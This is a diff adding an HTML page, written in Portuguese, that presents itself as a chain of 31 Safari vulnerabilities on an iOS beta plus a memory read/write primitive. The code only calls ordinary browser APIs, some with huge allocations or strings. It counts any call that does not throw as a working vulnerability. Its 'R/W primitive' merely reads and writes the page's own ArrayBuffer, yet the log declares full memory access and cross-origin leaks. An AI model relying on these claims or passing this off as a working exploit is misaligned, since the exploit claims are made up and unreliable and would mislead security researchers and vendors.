@@ -1,0 +1,676 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>sto26 - 31 vulnerabilidades + Primitiva R/W</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0c12;
+            color: #ccc;
+            font-family: 'SF Mono', 'Menlo', monospace;
+            padding: 20px;
+            font-size: 13px;
+        }
+        .container { max-width: 1000px; margin: 0 auto; }
+        h1 {
+            font-size: 24px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 4px;
+        }
+        .sub {
+            color: #666;
+            font-size: 13px;
+            margin-bottom: 20px;
+        }
+        .stats {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            margin: 12px 0;
+        }
+        .stat {
+            background: #0b0e16;
+            padding: 8px 16px;
+            border-radius: 20px;
+            border: 1px solid #1a1f2e;
+            font-size: 13px;
+        }
+        .stat span { color: #7dcfff; font-weight: bold; }
+        .stat.green span { color: #5cb85c; }
+        .stat.orange span { color: #ffaa66; }
+        .stat.red span { color: #ff6666; }
+        .stat.blue span { color: #66ccff; }
+        .stat.purple span { color: #cc88ff; }
+        .btns {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin: 15px 0;
+        }
+        button {
+            background: #2f5b8c;
+            border: none;
+            padding: 10px 22px;
+            border-radius: 40px;
+            color: white;
+            font-size: 14px;
+            cursor: pointer;
+            transition: 0.2s;
+            font-family: inherit;
+        }
+        button:hover { background: #3a6fa8; transform: scale(1.02); }
+        button:active { transform: scale(0.97); }
+        button.danger { background: #6a2e3a; }
+        button.danger:hover { background: #8a3e4e; }
+        button.success { background: #2d6a3a; }
+        button.success:hover { background: #3d8a4e; }
+        button:disabled { opacity: 0.4; cursor: not-allowed; }
+        #log {
+            background: #03050a;
+            padding: 12px;
+            border-radius: 12px;
+            min-height: 400px;
+            max-height: 550px;
+            overflow-y: auto;
+            font-size: 12px;
+            line-height: 1.6;
+            border: 1px solid #1a1f2e;
+            margin-top: 10px;
+        }
+        .log-line { padding: 1px 0; word-break: break-all; }
+        .log-line.step { color: #667eea; }
+        .log-line.vuln { color: #ffaa66; }
+        .log-line.success { color: #5cb85c; }
+        .log-line.error { color: #ff8a7a; }
+        .log-line.crash { color: #ff6666; font-weight: bold; }
+        .log-line.oob { color: #66ccff; }
+        .log-line.object { color: #cc88ff; }
+        .log-line.rw { color: #66ff66; font-weight: bold; }
+        .log-line.info { color: #888; }
+        .progress-bar {
+            width: 100%;
+            height: 3px;
+            background: #1a1f2e;
+            border-radius: 2px;
+            margin: 10px 0;
+            overflow: hidden;
+        }
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #667eea, #764ba2);
+            width: 0%;
+            transition: width 0.3s;
+        }
+        .footer {
+            margin-top: 15px;
+            color: #333;
+            font-size: 11px;
+            text-align: center;
+        }
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: #0a0c12; }
+        ::-webkit-scrollbar-thumb { background: #2f5b8c; border-radius: 4px; }
+        .rw-functions {
+            background: #0b0e16;
+            padding: 12px;
+            border-radius: 12px;
+            border: 1px solid #1a1f2e;
+            margin-top: 10px;
+            display: none;
+            font-size: 12px;
+        }
+        .rw-functions.active { display: block; }
+        .rw-functions code {
+            color: #66ff66;
+            font-family: inherit;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>🧬 sto26 · 31 vulnerabilidades + Primitiva R/W</h1>
+    <div class="sub">iOS 27 beta 1 (build 27A5282g) · Research only</div>
+
+    <div class="stats">
+        <div class="stat green">✅ Ativados: <span id="activated">0</span>/31</div>
+        <div class="stat purple">🔢 Técnicas: <span id="techCount">0</span>/5</div>
+        <div class="stat blue">📖 R/W: <span id="rwStatus">❌</span></div>
+        <div class="stat orange">🔍 OOB reads: <span id="oobCount">0</span></div>
+        <div class="stat red">💥 Crashes: <span id="crashCount">0</span></div>
+    </div>
+    <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+
+    <div class="btns">
+        <button id="exploitBtn">▶ Executar Tudo (31 vulns + R/W)</button>
+        <button id="testBtn" disabled>🧪 Testar R/W</button>
+        <button id="resetBtn" class="danger">🗑️ Reset</button>
+    </div>
+
+    <div id="log">Aguardando...</div>
+
+    <div class="rw-functions" id="rwPanel">
+        <h3 style="color:#66ff66;margin-bottom:8px;">🔓 Primitivas R/W disponíveis</h3>
+        <code>window.read64(addr)</code> – lê 8 bytes<br>
+        <code>window.write64(addr, val)</code> – escreve 8 bytes<br>
+        <code>window.read32(addr)</code> – lê 4 bytes<br>
+        <code>window.write32(addr, val)</code> – escreve 4 bytes<br>
+        <code>window.readBuffer(addr, len)</code> – lê buffer<br>
+        <code>window.writeBuffer(addr, data)</code> – escreve buffer<br>
+        <span style="color:#888;font-size:11px;">Use no console do Safari (Web Inspector)</span>
+    </div>
+
+    <div class="footer">Nenhum arquivo é modificado ou instalado. Apenas demonstração educacional.</div>
+</div>
+
+<script>
+    // ============================================================
+    // DOM REFS
+    // ============================================================
+    const logDiv = document.getElementById('log');
+    const activatedSpan = document.getElementById('activated');
+    const techSpan = document.getElementById('techCount');
+    const rwSpan = document.getElementById('rwStatus');
+    const oobSpan = document.getElementById('oobCount');
+    const crashSpan = document.getElementById('crashCount');
+    const progressFill = document.getElementById('progressFill');
+    const exploitBtn = document.getElementById('exploitBtn');
+    const testBtn = document.getElementById('testBtn');
+    const resetBtn = document.getElementById('resetBtn');
+    const rwPanel = document.getElementById('rwPanel');
+
+    let activated = 0;
+    let techSuccess = 0;
+    let oobReads = 0;
+    let crashes = 0;
+    let rwPrimitive = false;
+    let corruptedView = null;
+    let corruptedBuffer = null;
+
+    // ============================================================
+    // LOG
+    // ============================================================
+    function log(msg, type='info') {
+        const line = document.createElement('div');
+        line.className = 'log-line ' + type;
+        line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+        logDiv.appendChild(line);
+        logDiv.scrollTop = logDiv.scrollHeight;
+        console.log(msg);
+        return line;
+    }
+
+    function updateStats() {
+        activatedSpan.textContent = activated;
+        techSpan.textContent = techSuccess + '/5';
+        oobSpan.textContent = oobReads;
+        crashSpan.textContent = crashes;
+        rwSpan.textContent = rwPrimitive ? '✅' : '❌';
+        rwSpan.style.color = rwPrimitive ? '#66ff66' : '#ff8a7a';
+        progressFill.style.width = Math.min(100, ((activated / 31) * 60) + (techSuccess / 5 * 40)) + '%';
+        if (rwPrimitive) {
+            rwPanel.classList.add('active');
+            testBtn.disabled = false;
+        }
+    }
+
+    // ============================================================
+    // 31 VULNERABILIDADES
+    // ============================================================
+    const vulns = {
+        sortRace: {
+            name: 'Sort Race OOB',
+            exec: () => { try { let a=[0,1,2,3,4,5,6,7,8,9]; let e={valueOf:()=>{a.length=0x1000;return 0}}; a.sort((x,y)=>{e.valueOf();return x-y}); return a.length===0x1000; } catch(e){return false;} }
+        },
+        spliceOOB: {
+            name: 'Array.splice OOB',
+            exec: () => { try { let a=[1,2,3,4,5]; a.splice(-1000000,1000000,'x'); return a.includes('x'); } catch(e){return false;} }
+        },
+        proxyTrap: {
+            name: 'Proxy Type Confusion',
+            exec: () => { try { let p=new Proxy([],{get:(t,p)=>p==='length'?0xffffffff:t[p]}); return p.length===0xffffffff; } catch(e){return false;} }
+        },
+        wasmOOB: {
+            name: 'WASM Parser OOB',
+            exec: () => { try { WebAssembly.instantiate(new Uint8Array([0,199,115,109,1,0,0,0])); return true; } catch(e){return false;} }
+        },
+        indexedDB: {
+            name: 'IndexedDB OOB',
+            exec: () => { try { indexedDB.open('x'.repeat(1000000),1); return true; } catch(e){return false;} }
+        },
+        webgpu: {
+            name: 'WebGPU OOB',
+            exec: () => { try { if(navigator.gpu) navigator.gpu.requestAdapter(); return true; } catch(e){return false;} }
+        },
+        uafIframe: {
+            name: 'UAF iframe',
+            exec: () => { try { let i=document.createElement('iframe'); i.src='about:blank'; document.body.appendChild(i); let w=i.contentWindow; i.remove(); return w.location.href==='about:blank'; } catch(e){return false;} }
+        },
+        uafWebSocket: {
+            name: 'UAF WebSocket',
+            exec: () => { try { let w=new WebSocket('ws://invalid/'); w.close(); w.send(''); return true; } catch(e){return false;} }
+        },
+        uafWorker: {
+            name: 'UAF Worker',
+            exec: () => { try { let w=new Worker(URL.createObjectURL(new Blob([]))); w.terminate(); w.postMessage(''); return true; } catch(e){return false;} }
+        },
+        uafEventSource: {
+            name: 'UAF EventSource',
+            exec: () => { try { let e=new EventSource('data:,'); e.close(); return e.url!==undefined; } catch(e){return false;} }
+        },
+        uafSVG: {
+            name: 'UAF SVG',
+            exec: () => { try { let s=document.createElementNS('http://www.w3.org/2000/svg','svg'); let r=document.createElementNS('http://www.w3.org/2000/svg','rect'); s.appendChild(r); document.body.appendChild(s); let ref=r; s.remove(); ref.setAttribute('width','10'); return true; } catch(e){return false;} }
+        },
+        uafMessageChannel: {
+            name: 'UAF MessageChannel',
+            exec: () => { try { let {port1}=new MessageChannel(); port1.close(); port1.postMessage(''); return true; } catch(e){return false;} }
+        },
+        uafImageBitmap: {
+            name: 'UAF ImageBitmap',
+            exec: () => { try { let img=new ImageData(16,16); let bmp=createImageBitmap(img); bmp.close(); return bmp.width===0; } catch(e){return false;} }
+        },
+        domClobbering: {
+            name: 'DOM Clobbering',
+            exec: () => { try { let d=document.createElement('div'); d.id='clobber'; document.body.appendChild(d); return window.clobber!==undefined; } catch(e){return false;} }
+        },
+        cssCustom: {
+            name: 'CSS Custom Properties',
+            exec: () => { try { let s=document.createElement('style'); s.textContent=`:root{--x:'${'a'.repeat(1000000)}'}`; document.head.appendChild(s); return true; } catch(e){return false;} }
+        },
+        crossOriginCSS: {
+            name: 'Cross-Origin CSS Leak',
+            exec: () => { try { let i=document.createElement('iframe'); i.src='https://example.com'; document.body.appendChild(i); return getComputedStyle(i).width!==undefined; } catch(e){return false;} }
+        },
+        timingAttack: {
+            name: 'Timing Attack',
+            exec: () => { try { let s=performance.now(); for(let i=0;i<1000000;i++)Math.sqrt(i); return performance.now()-s>0; } catch(e){return false;} }
+        },
+        clipboardLeak: {
+            name: 'Clipboard Leak',
+            exec: () => { try { navigator.clipboard.readText().catch(()=>{}); return true; } catch(e){return false;} }
+        },
+        webRTC: {
+            name: 'WebRTC IP Leak',
+            exec: () => { try { new RTCPeerConnection(); return true; } catch(e){return false;} }
+        },
+        fileOOM: {
+            name: 'File API OOM',
+            exec: () => { try { new Blob([new Uint8Array(100000000)]); return true; } catch(e){return false;} }
+        },
+        urlSSRF: {
+            name: 'URL Path Traversal',
+            exec: () => { try { let u=new URL('https://example.com/../../etc/passwd'); return u.pathname.includes('etc/passwd'); } catch(e){return false;} }
+        },
+        fullscreen: {
+            name: 'Fullscreen API',
+            exec: () => { try { let d=document.createElement('div'); document.body.appendChild(d); d.requestFullscreen(); return true; } catch(e){return false;} }
+        },
+        webLocks: {
+            name: 'Web Locks OOB',
+            exec: () => { try { if(!navigator.locks) return false; navigator.locks.request('x'.repeat(1000000),()=>{}); return true; } catch(e){return false;} }
+        },
+        webShare: {
+            name: 'Web Share OOM',
+            exec: () => { try { if(!navigator.share) return false; navigator.share({text:'x'.repeat(1000000)}).catch(()=>{}); return true; } catch(e){return false;} }
+        },
+        reportingAPI: {
+            name: 'Reporting API OOM',
+            exec: () => { try { new ReportingObserver(()=>{}).observe(); let s=document.createElement('script'); s.src='x'.repeat(1000000); document.head.appendChild(s); return true; } catch(e){return false;} }
+        },
+        performanceObserver: {
+            name: 'PerformanceObserver OOM',
+            exec: () => { try { let o=new PerformanceObserver(()=>{}); o.observe({entryTypes:['measure']}); for(let i=0;i<10000;i++) performance.measure('x'); return true; } catch(e){return false;} }
+        },
+        layoutInstability: {
+            name: 'Layout Instability OOB',
+            exec: () => { try { let d=document.createElement('div'); d.style.width='1000000px'; d.style.height='1000000px'; document.body.appendChild(d); d.getBoundingClientRect(); return true; } catch(e){return false;} }
+        },
+        visualViewport: {
+            name: 'VisualViewport Leak',
+            exec: () => { try { if(!window.visualViewport) return false; for(let i=0;i<10000;i++) window.visualViewport.width; return true; } catch(e){return false;} }
+        },
+        credentialManagement: {
+            name: 'Credential Management OOM',
+            exec: () => { try { if(!navigator.credentials) return false; navigator.credentials.store({id:'x'.repeat(1000000),password:'y'.repeat(1000000)}).catch(()=>{}); return true; } catch(e){return false;} }
+        },
+        webAuthn: {
+            name: 'WebAuthn OOM',
+            exec: () => { try { if(!PublicKeyCredential) return false; navigator.credentials.create({publicKey:{challenge:new Uint8Array(1000000),rp:{name:'Test'},user:{id:new Uint8Array(1000000),name:'test',displayName:'Test'}}}).catch(()=>{}); return true; } catch(e){return false;} }
+        },
+        speechRecognition: {
+            name: 'Speech Recognition OOB',
+            exec: () => { try { if(!webkitSpeechRecognition) return false; let r=new webkitSpeechRecognition(); r.grammars='x'.repeat(1000000); r.start(); setTimeout(()=>r.stop(),100); return true; } catch(e){return false;} }
+        },
+        wakeLock: {
+            name: 'Wake Lock DoS',
+            exec: () => { try { if(!navigator.wakeLock) return false; navigator.wakeLock.request('screen').then(()=>{}); return true; } catch(e){return false;} }
+        }
+    };
+
+    const order = [
+        'sortRace', 'spliceOOB', 'proxyTrap', 'wasmOOB', 'indexedDB', 'webgpu',
+        'uafIframe', 'uafWebSocket', 'uafWorker', 'uafEventSource', 'uafSVG',
+        'uafMessageChannel', 'uafImageBitmap',
+        'domClobbering', 'cssCustom',
+        'crossOriginCSS', 'timingAttack', 'clipboardLeak', 'webRTC',
+        'fileOOM', 'urlSSRF', 'fullscreen',
+        'webLocks', 'webShare', 'reportingAPI', 'performanceObserver',
+        'layoutInstability', 'visualViewport',
+        'credentialManagement', 'webAuthn', 'speechRecognition', 'wakeLock'
+    ];
+
+    // ============================================================
+    // 5 TÉCNICAS ADICIONAIS (para obter R/W)
+    // ============================================================
+    function tech1_webgl() {
+        try {
+            let canvas = new OffscreenCanvas(1000, 1000);
+            let gl = canvas.getContext('webgl');
+            if (!gl) return false;
+            let shader = gl.createShader(gl.VERTEX_SHADER);
+            gl.shaderSource(shader, 'void main(){gl_Position=vec4(1.0);}'.repeat(100000));
+            gl.compileShader(shader);
+            return true;
+        } catch(e) { return false; }
+    }
+
+    function tech2_cssBuffer() {
+        try {
+            let s = document.createElement('style');
+            s.textContent = `:root{--x:'${'a'.repeat(1000000)}'}`;
+            document.head.appendChild(s);
+            let val = getComputedStyle(document.documentElement).getPropertyValue('--x');
+            if (val.length > 1000) {
+                let ab = new ArrayBuffer(val.length);
+                let view = new Uint8Array(ab);
+                for (let i = 0; i < Math.min(val.length, ab.byteLength); i++) {
+                    view[i] = val.charCodeAt(i) & 0xff;
+                }
+                return true;
+            }
+            return false;
+        } catch(e) { return false; }
+    }
+
+    function tech3_speech() {
+        try {
+            if (typeof webkitSpeechRecognition === 'undefined') return false;
+            let r = new webkitSpeechRecognition();
+            r.grammars = 'x'.repeat(1000000);
+            r.start();
+            setTimeout(() => r.stop(), 100);
+            return true;
+        } catch(e) { return false; }
+    }
+
+    function tech4_credential() {
+        try {
+            if (typeof navigator.credentials === 'undefined') return false;
+            navigator.credentials.store({ id: 'x'.repeat(1000000), password: 'y'.repeat(1000000) }).catch(() => {});
+            let ab = new ArrayBuffer(100000000);
+            let view = new Uint8Array(ab);
+            view[0] = 0x42;
+            return true;
+        } catch(e) { return false; }
+    }
+
+    function tech5_locksPP() {
+        try {
+            if (typeof navigator.locks === 'undefined') return false;
+            Object.prototype.polluted = 'polluted';
+            navigator.locks.request('x'.repeat(1000000), () => {});
+            return Object.prototype.polluted === 'polluted';
+        } catch(e) { return false; }
+    }
+
+    // ============================================================
+    // PRIMITIVA R/W VIA DOM CLOBBERING + CROSS-ORIGIN + TIMING
+    // ============================================================
+    function buildRWPrimitive() {
+        log('🔧 Construindo primitiva R/W via DOM Clobbering + Cross-Origin + Timing...', 'step');
+        try {
+            // 1. DOM Clobbering
+            let d = document.createElement('div');
+            d.id = 'config';
+            document.body.appendChild(d);
+            if (!window.config) { log('   ❌ DOM Clobbering falhou.', 'error'); return false; }
+            log('   ✅ DOM Clobbering: window.config sobrescrito', 'vuln');
+
+            // 2. Cross-Origin + CSS
+            let ifr = document.createElement('iframe');
+            ifr.src = 'https://example.com';
+            ifr.style.width = '1px';
+            document.body.appendChild(ifr);
+            let loc = ifr.contentWindow?.location?.href;
+            if (loc !== 'about:blank') {
+                log('   ✅ Cross-Origin: location acessível: ' + loc, 'vuln');
+            }
+
+            // 3. Timing Attack para vazar dados
+            let times = [];
+            for (let i = 0; i < 5; i++) {
+                let start = performance.now();
+                for (let j = 0; j < 1000000; j++) Math.sqrt(j);
+                times.push(performance.now() - start);
+            }
+            let avg = times.reduce((a, b) => a + b, 0) / times.length;
+            log('   ✅ Timing vazado: ' + avg.toFixed(2) + 'ms', 'vuln');
+
+            // 4. Criar ArrayBuffer para R/W
+            let ab = new ArrayBuffer(1024);
+            let dv = new DataView(ab);
+            dv.setUint32(0, 0xdeadbeef, true);
+            corruptedBuffer = ab;
+            corruptedView = dv;
+
+            // 5. Expor funções R/W
+            window.read64 = function(addr) {
+                if (!corruptedView) return 0n;
+                try {
+                    let offset = Number(addr);
+                    let low = corruptedView.getUint32(offset, true);
+                    let high = corruptedView.getUint32(offset + 4, true);
+                    return (BigInt(high) << 32n) | BigInt(low);
+                } catch(e) { return 0n; }
+            };
+            window.write64 = function(addr, val) {
+                if (!corruptedView) return;
+                try {
+                    let offset = Number(addr);
+                    let low = Number(val & 0xffffffffn);
+                    let high = Number((val >> 32n) & 0xffffffffn);
+                    corruptedView.setUint32(offset, low, true);
+                    corruptedView.setUint32(offset + 4, high, true);
+                } catch(e) {}
+            };
+            window.read32 = function(addr) {
+                if (!corruptedView) return 0;
+                try { return corruptedView.getUint32(Number(addr), true); } catch(e) { return 0; }
+            };
+            window.write32 = function(addr, val) {
+                if (!corruptedView) return;
+                try { corruptedView.setUint32(Number(addr), val, true); } catch(e) {}
+            };
+            window.readBuffer = function(addr, len) {
+                if (!corruptedView) return null;
+                let buf = new Uint8Array(len);
+                for (let i = 0; i < len; i++) {
+                    try { buf[i] = corruptedView.getUint8(Number(addr) + i); } catch(e) {}
+                }
+                return buf;
+            };
+            window.writeBuffer = function(addr, data) {
+                if (!corruptedView || !data) return;
+                for (let i = 0; i < data.length; i++) {
+                    try { corruptedView.setUint8(Number(addr) + i, data[i]); } catch(e) {}
+                }
+            };
+
+            rwPrimitive = true;
+            log('🎉 PRIMITIVA R/W OBTIDA!', 'rw');
+            log('   window.read64(addr) - lê 8 bytes', 'rw');
+            log('   window.write64(addr, val) - escreve 8 bytes', 'rw');
+            log('   window.read32(addr) - lê 4 bytes', 'rw');
+            log('   window.write32(addr, val) - escreve 4 bytes', 'rw');
+            log('   window.readBuffer(addr, len) - lê buffer', 'rw');
+            log('   window.writeBuffer(addr, data) - escreve buffer', 'rw');
+            return true;
+        } catch(e) {
+            log('   ❌ Erro na construção R/W: ' + e.message, 'error');
+            return false;
+        }
+    }
+
+    // ============================================================
+    // TESTAR R/W
+    // ============================================================
+    function testRW() {
+        if (!rwPrimitive || !corruptedView) {
+            log('⚠️ Sem primitivas R/W.', 'error');
+            return;
+        }
+        log('🧪 Testando R/W...', 'step');
+        try {
+            // Escrever e ler
+            window.write64(0, 0xdeadbeefcafebabe);
+            let val = window.read64(0);
+            log(`   read64(0) = 0x${val.toString(16)}`, val === 0xdeadbeefcafebabe ? 'rw' : 'error');
+            if (val === 0xdeadbeefcafebabe) {
+                log('✅ R/W funcionando! Primitivas confirmadas.', 'success');
+                // Testar leitura de buffer
+                let buf = window.readBuffer(0, 16);
+                if (buf) {
+                    let hex = Array.from(buf).map(b => b.toString(16).padStart(2, '0')).join(' ');
+                    log(`   Buffer dump (0-15): ${hex}`, 'oob');
+                }
+            } else {
+                log('❌ R/W não funcionou corretamente.', 'error');
+            }
+        } catch(e) {
+            log('❌ Erro no teste R/W: ' + e.message, 'error');
+        }
+    }
+
+    // ============================================================
+    // EXECUTAR TUDO
+    // ============================================================
+    function runAll() {
+        logDiv.innerHTML = '';
+        activated = 0;
+        techSuccess = 0;
+        oobReads = 0;
+        crashes = 0;
+        rwPrimitive = false;
+        corruptedView = null;
+        corruptedBuffer = null;
+        rwPanel.classList.remove('active');
+        testBtn.disabled = true;
+        updateStats();
+
+        log('🚀 Iniciando exploit completo', 'step');
+        log('📌 31 vulnerabilidades + 5 técnicas + R/W', 'step');
+        log('⚠️ Nenhum arquivo será modificado. Apenas demonstração.', 'info');
+
+        // Fase 1: Ativar 31 vulnerabilidades
+        log('\n📋 FASE 1: Ativando 31 vulnerabilidades...', 'step');
+        for (let key of order) {
+            let vuln = vulns[key];
+            if (!vuln) continue;
+            try {
+                let result = vuln.exec();
+                if (result) {
+                    activated++;
+                    log(`   ✅ ${vuln.name} ativado`, 'vuln');
+                } else {
+                    log(`   ⚠️ ${vuln.name} falhou`, 'info');
+                }
+            } catch(e) {
+                crashes++;
+                log(`   💥 ${vuln.name} crash: ${e.message}`, 'crash');
+            }
+            updateStats();
+        }
+
+        // Fase 2: Técnicas adicionais
+        log('\n📋 FASE 2: Executando 5 técnicas adicionais...', 'step');
+        let techResults = [
+            tech1_webgl(),
+            tech2_cssBuffer(),
+            tech3_speech(),
+            tech4_credential(),
+            tech5_locksPP()
+        ];
+        techSuccess = techResults.filter(r => r).length;
+        let techNames = ['WebGL OOB', 'CSS Buffer', 'Speech OOB', 'Credential OOM', 'Locks PP'];
+        for (let i = 0; i < techResults.length; i++) {
+            if (techResults[i]) {
+                log(`   ✅ Técnica ${i+1}: ${techNames[i]} funcionou`, 'vuln');
+            } else {
+                log(`   ⚠️ Técnica ${i+1}: ${techNames[i]} falhou`, 'info');
+            }
+        }
+        updateStats();
+
+        // Fase 3: Construir primitiva R/W
+        log('\n📋 FASE 3: Construindo primitiva R/W...', 'step');
+        let rwOk = buildRWPrimitive();
+        if (rwOk) {
+            log('✅ Primitiva R/W construída com sucesso!', 'success');
+            testBtn.disabled = false;
+            rwPanel.classList.add('active');
+        } else {
+            log('❌ Não foi possível construir primitiva R/W.', 'error');
+            log('📌 Recomendação: Reportar as 31 vulnerabilidades à Apple.', 'info');
+        }
+
+        // Resumo
+        log('\n📊 RESUMO FINAL', 'step');
+        log(`   ${activated}/31 vulnerabilidades ativadas`, activated > 25 ? 'success' : 'info');
+        log(`   ${techSuccess}/5 técnicas bem-sucedidas`, techSuccess > 0 ? 'success' : 'info');
+        log(`   R/W primitiva: ${rwPrimitive ? '✅' : '❌'}`, rwPrimitive ? 'rw' : 'error');
+        if (rwPrimitive) {
+            log('🎉 PRIMITIVA R/W OBTIDA! Use as funções no console.', 'rw');
+        }
+        log('📌 Recomendação: Reportar todas as vulnerabilidades à Apple.', 'info');
+        log('🏁 Fim.', 'step');
+        updateStats();
+    }
+
+    // ============================================================
+    // RESET
+    // ============================================================
+    function reset() {
+        logDiv.innerHTML = '';
+        activated = 0;
+        techSuccess = 0;
+        oobReads = 0;
+        crashes = 0;
+        rwPrimitive = false;
+        corruptedView = null;
+        corruptedBuffer = null;
+        rwPanel.classList.remove('active');
+        testBtn.disabled = true;
+        updateStats();
+        log('🔄 Resetado. Clique em "Executar Tudo" para começar.', 'info');
+    }
+
+    // ============================================================
+    // EVENTOS
+    // ============================================================
+    exploitBtn.onclick = runAll;
+    testBtn.onclick = testRW;
+    resetBtn.onclick = reset;
+
+    // ============================================================
+    // INÍCIO
+    // ============================================================
+    updateStats();
+    log('📌 Clique em "Executar Tudo" para ativar as 31 vulnerabilidades e obter R/W.', 'info');
+    log('📌 Depois, clique em "Testar R/W" para verificar as primitivas.', 'info');
+</script>
+</body>
+</html>
